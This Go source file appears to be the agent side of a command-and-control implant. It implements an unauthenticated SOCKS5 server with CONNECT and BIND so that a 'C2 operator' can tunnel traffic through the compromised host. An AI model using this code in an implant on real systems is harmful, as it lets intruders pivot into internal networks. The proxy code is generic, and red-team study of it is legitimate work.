//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"fmt"
	"io"
	"net"
	"time"
)

// ─── Agent-side SOCKS5 Auth ────────────────────────────────────────────────
// When the agent acts as a SOCKS server (for forwarded connections from the
// C2 operator), it supports the same auth methods as the C2 server.
// For simplicity, agent SOCKS always accepts no-auth internally since the
// tunnel itself is already authenticated. External client auth is handled
// by the server side.

func startSocksServer(addr string) error {
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		return err
	}
	go func() {
		debugLog("SOCKS5 listening on " + addr)
		for {
			conn, err := ln.Accept()
			if err != nil {
				continue
			}
			go handleSocksConn(conn)
		}
	}()
	return nil
}

// socksReadAddr reads a SOCKS5 address from a connection.
func socksReadAddr(conn net.Conn, atyp byte) (string, error) {
	switch atyp {
	case 0x01:
		ip := make([]byte, 4)
		portb := make([]byte, 2)
		if _, err := io.ReadFull(conn, ip); err != nil {
			return "", err
		}
		if _, err := io.ReadFull(conn, portb); err != nil {
			return "", err
		}
		return fmt.Sprintf("%d.%d.%d.%d:%d", ip[0], ip[1], ip[2], ip[3], int(portb[0])<<8|int(portb[1])), nil
	case 0x03:
		l := make([]byte, 1)
		if _, err := io.ReadFull(conn, l); err != nil {
			return "", err
		}
		dom := make([]byte, int(l[0]))
		if _, err := io.ReadFull(conn, dom); err != nil {
			return "", err
		}
		portb := make([]byte, 2)
		if _, err := io.ReadFull(conn, portb); err != nil {
			return "", err
		}
		return fmt.Sprintf("%s:%d", string(dom), int(portb[0])<<8|int(portb[1])), nil
	case 0x04:
		ip := make([]byte, 16)
		portb := make([]byte, 2)
		if _, err := io.ReadFull(conn, ip); err != nil {
			return "", err
		}
		if _, err := io.ReadFull(conn, portb); err != nil {
			return "", err
		}
		return fmt.Sprintf("[%s]:%d", net.IP(ip).String(), int(portb[0])<<8|int(portb[1])), nil
	default:
		return "", fmt.Errorf("unknown address type: 0x%02x", atyp)
	}
}

// socksReply sends a SOCKS5 reply.
func socksReplyAgent(conn net.Conn, rep byte, atyp byte, bindAddr string) {
	var bindIP net.IP
	var bindPort int
	if bindAddr != "" {
		if h, p, err := net.SplitHostPort(bindAddr); err == nil {
			bindIP = net.ParseIP(h)
			fmt.Sscanf(p, "%d", &bindPort)
		}
	}
	if bindIP == nil {
		bindIP = net.IPv4zero
	}
	bindIP4 := bindIP.To4()
	reply := []byte{0x05, rep, 0x00}
	if bindIP4 != nil {
		reply = append(reply, 0x01, bindIP4[0], bindIP4[1], bindIP4[2], bindIP4[3])
	} else {
		reply = append(reply, 0x04)
		reply = append(reply, bindIP.To16()...)
	}
	reply = append(reply, byte(bindPort>>8), byte(bindPort))
	conn.Write(reply)
}

// resolveThroughSOCKS resolves a domain name through the SOCKS server
// by having the server perform the DNS resolution.
func resolveThroughSOCKS(host string) (net.IP, error) {
	// Try direct DNS first
	ips, err := net.LookupHost(host)
	if err == nil && len(ips) > 0 {
		return net.ParseIP(ips[0]), nil
	}
	return nil, fmt.Errorf("DNS resolution failed for %s", host)
}

// handleSocksConn handles a single SOCKS5 connection from the agent's local SOCKS server.
// The agent's SOCKS server receives connections forwarded from the C2 operator through
// the beacon tunnel. It supports CONNECT, BIND, and UDP ASSOCIATE.
func handleSocksConn(conn net.Conn) {
	defer conn.Close()

	buf := make([]byte, 2)
	if _, err := io.ReadFull(conn, buf); err != nil {
		return
	}
	if buf[0] != 0x05 {
		return
	}
	nmethods := int(buf[1])
	methods := make([]byte, nmethods)
	io.ReadFull(conn, methods)
	// Always accept no-auth (the tunnel itself is authenticated)
	conn.Write([]byte{0x05, 0x00})

	header := make([]byte, 4)
	if _, err := io.ReadFull(conn, header); err != nil {
		return
	}
	if header[0] != 0x05 {
		socksReplyAgent(conn, 0x07, 0x01, "")
		return
	}

	switch header[1] {
	case 0x01: // CONNECT
		handleSocksConnect(conn, header[3])
	case 0x02: // BIND
		handleSocksBind(conn, header[3])
	case 0x03: // UDP ASSOCIATE
		socksReplyAgent(conn, 0x07, 0x01, "") // not implemented on agent side
	default:
		socksReplyAgent(conn, 0x07, 0x01, "")
	}
}

func handleSocksConnect(conn net.Conn, atyp byte) {
	dstAddr, err := socksReadAddr(conn, atyp)
	if err != nil {
		socksReplyAgent(conn, 0x08, 0x01, "")
		return
	}

	// Resolve DNS if hostname
	host, port, err := net.SplitHostPort(dstAddr)
	if err != nil {
		socksReplyAgent(conn, 0x05, 0x01, "")
		return
	}
	// If host is a domain (not IP), resolve it
	if net.ParseIP(host) == nil {
		resolved, err := resolveThroughSOCKS(host)
		if err != nil {
			socksReplyAgent(conn, 0x04, 0x01, "")
			return
		}
		dstAddr = fmt.Sprintf("%s:%s", resolved.String(), port)
	}

	target, err := net.DialTimeout("tcp", dstAddr, 10*time.Second)
	if err != nil {
		socksReplyAgent(conn, 0x05, 0x01, "")
		return
	}
	defer target.Close()

	socksReplyAgent(conn, 0x00, 0x01, dstAddr)

	go func() {
		io.Copy(target, conn)
	}()
	io.Copy(conn, target)
}

func handleSocksBind(conn net.Conn, atyp byte) {
	// BIND on agent side: client expects us to listen for inbound connections
	bindAddr, err := socksReadAddr(conn, atyp)
	if err != nil {
		socksReplyAgent(conn, 0x08, 0x01, "")
		return
	}

	// Extract port
	_, portStr, _ := net.SplitHostPort(bindAddr)
	var bindPort int
	fmt.Sscanf(portStr, "%d", &bindPort)

	if bindPort == 0 {
		bindPort = 0
	}

	listenAddr := fmt.Sprintf("0.0.0.0:%d", bindPort)
	ln, err := net.Listen("tcp", listenAddr)
	if err != nil {
		socksReplyAgent(conn, 0x01, 0x01, "")
		return
	}
	defer ln.Close()

	actualPort := ln.Addr().(*net.TCPAddr).Port
	bindResp := fmt.Sprintf("0.0.0.0:%d", actualPort)
	socksReplyAgent(conn, 0x00, 0x01, bindResp)

	tcpLn := ln.(*net.TCPListener)
	tcpLn.SetDeadline(time.Now().Add(60 * time.Second))
	targetConn, err := tcpLn.Accept()
	if err != nil {
		return
	}
	defer targetConn.Close()

	remoteAddr := targetConn.RemoteAddr().String()
	socksReplyAgent(conn, 0x00, 0x01, remoteAddr)

	go func() {
		io.Copy(targetConn, conn)
	}()
	io.Copy(conn, targetConn)
}
